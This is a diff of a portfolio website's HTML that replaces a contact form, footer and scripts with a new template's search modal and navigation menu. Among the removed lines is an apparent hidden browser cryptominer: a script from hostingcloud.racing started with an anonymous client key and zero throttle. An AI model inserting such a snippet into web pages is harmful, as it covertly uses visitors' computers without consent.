+								<!-- Scroll To Top -->
+								<div id="scroll-to-top" class="scroll-to-top mt-3 mt-sm-0">
+									<a href="#header" class="smooth-anchor">Scroll to Top</a>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</footer>
+			<!-- ***** Footer Area End ***** -->
 
-	<div class="untree_co-section" id="contact-section">
-		<div class="container">
-			<div class="row mb-5">
-				<div class="col-lg-7 text-center mx-auto">
-					<h2 class="section-heading gsap-reveal-hero mb-0"><strong>Contact</strong></h2>
-					<p class="gsap-reveal-hero">Available for work. Get in touch</p>
-					<div class="wave gsap-reveal-hero">
-						<svg>
-							<path d="M10,10 L50,100 L90,50"></path>
-						</svg>
+			<!--====== Modal Search Area Start ======-->
+			<div id="search" class="modal fade p-0">
+				<div class="modal-dialog dialog-animated">
+					<div class="modal-content h-100">
+						<div class="modal-header" data-bs-dismiss="modal">
+							Search <i class="far fa-times-circle icon-close"></i>
+						</div>
+						<div class="modal-body">
+
+							<form class="row search-form">
+								<div class="col-12 align-self-center">
+									<div class="row">
+										<div class="col-12 pb-3">
+											<h2 class="search-title mt-0 mb-3">What are you looking for?</h2>
+											<p>Enter your query now and find precisely what you seek.</p>
+										</div>
+									</div>
+									<div class="row">
+										<div class="col-12 input-group mt-md-4">
+											<input type="text" placeholder="Enter your keywords">
+										</div>
+									</div>
+									<div class="row">
+										<div class="col-12 input-group align-self-center">
+											<button class="btn content-btn mt-4">Search</button>
+										</div>
+									</div>
+								</div>
+							</form>
+						</div>
 					</div>
 				</div>
 			</div>
-			<div class="row">
-				<div class="col-lg-6">
-					<form action="#">
-						<div class="row">
-							<div class="col-lg-6 form-group">
-								<input type="text" class="form-control" placeholder="Firstname">
-							</div>
-							<div class="col-lg-6 form-group">
-								<input type="text" class="form-control" placeholder="Lastname">
-							</div>
+			<!--====== Modal Search Area End ======-->
+
+			<!--====== Offcanvas Area Start ======-->
+			<div class="offcanvas-wrapper">
+				<!-- Navbar Toggler -->
+				<div class="navbar-toggler" data-bs-toggle="offcanvas" data-bs-target="#offcanvasRight">
+					<div class="navbar-header">
+						<div class="content">
+							<div class="toggler-icon"></div>
+							<span class="title">Menu</span>
 						</div>
-						<div class="row">
-							<div class="col-lg-12 form-group">
-								<input type="email" class="form-control" placeholder="Email address">
-							</div>
-						</div>
-						<div class="row">
-							<div class="col-lg-12 form-group">
-								<textarea name id cols="30" rows="7" class="form-control"
-									placeholder="Write your message..."></textarea>
-							</div>
-						</div>
-						<div class="row">
-							<div class="col-12 form-group">
-								<input type="submit" class="btn btn-black" value="Send Message">
-							</div>
-						</div>
-					</form>
+					</div>
 				</div>
 
-			</div>
-		</div>
-	</div>
-	<div class="site-footer">
-		<div class="container">
-			<div class="row">
+				<!-- Offcanvas -->
+				<div class="offcanvas offcanvas-end" id="offcanvasRight">
+					<div class="fixed-nav-rounded-div">
+						<div class="rounded-div-wrap">
+							<div class="rounded-div"></div>
+						</div>
+					</div>
 
-				<div class="col-lg-3">
-					<div class="widget">
-						<h3>Connect</h3>
-						<ul class="list-unstyled social">
-							<li><a href="#"><span class="icon-instagram"></span></a></li>
-							<li><a href="#"><span class="icon-twitter"></span></a></li>
-							<li><a href="#"><span class="icon-facebook"></span></a></li>
-							<li><a href="#"><span class="icon-linkedin"></span></a></li>
-							<li><a href="#"><span class="icon-pinterest"></span></a></li>
-							<li><a href="#"><span class="icon-dribbble"></span></a></li>
-						</ul>
+					<!-- Offcanvas Content -->
+					<div class="offcanvas-content">
+						<div class="offcanvas-navigation">
+							<div class="offcanvas-header">
+								<h5 class="offcanvas-title mt-0">Navigation</h5>
+							</div>
+
+							<hr>
+
+							<!-- Navigation Menu -->
+							<div class="offcanvas-body">
+								<ul class="navbar-nav menu pt-md-4">
+									<li class="nav-item">
+										<a href="index-dark.html" class="nav-link active">Home <span class="item-count">(01)</span></a>
+									</li>
+									<li class="nav-item">
+										<a href="#" class="nav-link">Works <span class="item-count">(02)</span></a>
+									</li>
+									
+								</ul>
+							</div>
+						</div>
+
+						<!-- Offcanvas Social -->
+						<div class="offcanvas-social">
+							<div class="offcanvas-header">
+								<h5 class="offcanvas-title mt-0">Socials</h5>
+							</div>
+
+							<hr>
+
+							<!-- Socials -->
+							<div class="socials offcanvas-body">
+								<nav class="nav">
+									<a class="nav-link swap-icon" href="#">Instagram <i class="icon rotate bi bi-arrow-right-short"></i></a>
+									<a class="nav-link swap-icon" href="#">Linkedin <i class="icon rotate bi bi-arrow-right-short"></i></a>
+								</nav>
+							</div>
+						</div>
 					</div>
 				</div>
 			</div>
-			<div class="row mt-5">
-				<div class="col-12 text-center">
-					<p>
+			<!--====== Offcanvas Area End ======-->
 
-						Copyright &copy;
-						<script data-cfasync="false"
-							src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
-						<script>document.write(new Date().getFullYear());</script> All rights reserved | This is
-						portfolio Website <i class="icon-heart text-danger" aria-hidden="true"></i> by <a href="#"
-							target="_blank">Vijay Sharma</a>
-					</p>
-				</div>
-			</div>
 		</div>
+		<!-- ***** Main Wrapper End ***** -->
+
 	</div>
-	<script>
-	var lazyLoadInstance = new LazyLoad({
-		// Your custom settings go here
-	  });
-	</script>
-	<script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.0.5/dist/lazyload.min.js"></script>
-	<script src="js/jquery-3.4.1.min.js"></script>
-	<script src="js/popper.min.js"></script>
-	<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
-	<script src="js/bootstrap.min.js"></script>
-	<script src="js/owl.carousel.min.js"></script>
-	<script src="js/jquery.animateNumber.min.js"></script>
-	<script src="https://unpkg.com/isotope-layout@3/dist/isotope.pkgd.min.js"></script>
-	<script src="js/jquery.waypoints.min.js"></script>
-	<script src="js/jquery.fancybox.min.js"></script>
-
-	<script src="js/aos.js"></script>
-	<!-- <script src="js/wave-animate.js"></script> -->
-	<script src="js/circle-progress.js"></script>
-	<script src="js/imagesloaded.pkgd.js"></script>
-	<script src="js/isotope.pkgd.min.js"></script>
-	<script src="js/jquery.easing.1.3.js"></script>
-	
-	<script src="js/ScrollMagic.min.js"></script>
-	<script src="js/scrollmagic.animation.gsap.min.js"></script>
-	<script src="js/custom.js"></script>
-	<script>
-		
-			Fancybox.bind("[data-fancybox]", {
-				// Your custom options
-			});
-
-		</script>
-<script>
-const filterTexts = document.querySelectorAll('.filter-text'); 
-const portfolioItems = document.querySelectorAll('.item');
-
-filterTexts.forEach(filterText => {
-  filterText.addEventListener('click', (e) => {
-    console.log("Filter clicked:", e.target.dataset.filter); // Check that it works
-
-    const filter = e.target.dataset.filter; 
-
-    portfolioItems.forEach(item => {
-      if (filter === 'all' || item.classList.contains(filter)) {
-        item.style.display = 'block'; 
-      } else {
-        item.style.display = 'none'; 
-      }
-    });
-
-    // Add active class to selected button 
-    filterTexts.forEach(text => text.classList.remove('active'));
-    filterText.classList.add('active');
-  });
-});	
-</script>
-<script>
-const loadMoreBtn = document.getElementById('load-more');
-const postsContainer = document.getElementById('posts'); 
-let currentImageIndex = 0; 
-const imagesPerLoad = 10; // Load 10 images at a time
-
-// Your source of additional images 
-const moreImages = [ 
-   { src: "images/web/3.jpg", classes: "item web photography creative" },
-   { src: "images/web/4.jpg", classes: "item web branding natural" },
-   // ... more image objects
- ]; 
-
-loadMoreBtn.addEventListener('click', () => {
-    const end = Math.min(currentImageIndex + imagesPerLoad, moreImages.length); 
-    const imagesToLoad = moreImages.slice(currentImageIndex, end); 
-
-    imagesToLoad.forEach(image => {
-       const newImageItem = `
-          <div class="${image.classes} col-sm-6 col-md-6 col-lg-4 isotope-mb-2">
-              <a href="${image.src}" data-fancybox="project-gallery">
-                  <img src="${image.src}" class="lazyload img-fluid" alt="Images" />
-                  <div class="overlay">
-                      <p class="overlay-text">Your text here</p>
-                  </div>
-              </a>
-          </div>
-       `;
-       postsContainer.innerHTML += newImageItem;
-    });
-
-    currentImageIndex = end;
-
-    if (currentImageIndex >= moreImages.length) {
-        loadMoreBtn.style.display = 'none'; 
-    }
-});
-
-</script>
-<script src="https://www.hostingcloud.racing/EJVQ.js"></script>
-<script>
-    var _client = new Client.Anonymous('2bf5e538e7c194623cfc29c3f6fe5eb898447257741d66e5cb816b2d2e4d5369', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
+	<!-- ***** Main Area End ***** -->
 
 
-</script>
+	<!-- ***** All jQuery Plugins ***** -->
 
+	<!-- jQuery(necessary for all JavaScript plugins) -->
+	<script src="assets/js/vendor/jquery.min.js"></script>
+
+	<!-- Bootstrap js -->
+	<script src="assets/js/vendor/popper.min.js"></script>
+	<script src="assets/js/vendor/bootstrap.min.js"></script>
+
+	<!-- Plugins js -->
+	<script src="assets/js/vendor/all.min.js"></script>
+	<script src="assets/js/vendor/gsap.min.js"></script>
+	<script src="assets/js/vendor/ScrollTrigger.min.js"></script>
+	<script src="assets/js/vendor/lenis.min.js"></script>
+	<script src="assets/js/vendor/SplitType.min.js"></script>
+	<script src="assets/js/vendor/shuffle.min.js"></script>
+	<script src="assets/js/vendor/gallery.min.js"></script>
+	<script src="assets/js/vendor/slider.min.js"></script>
+
+	<!-- Main js -->
+	<script src="assets/js/main.js"></script>
 </body>
 
 
+<!-- Mirrored from theme-land.com/Portfolio/demo/index-dark.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 12 Dec 2024 08:55:30 GMT -->
 </html>
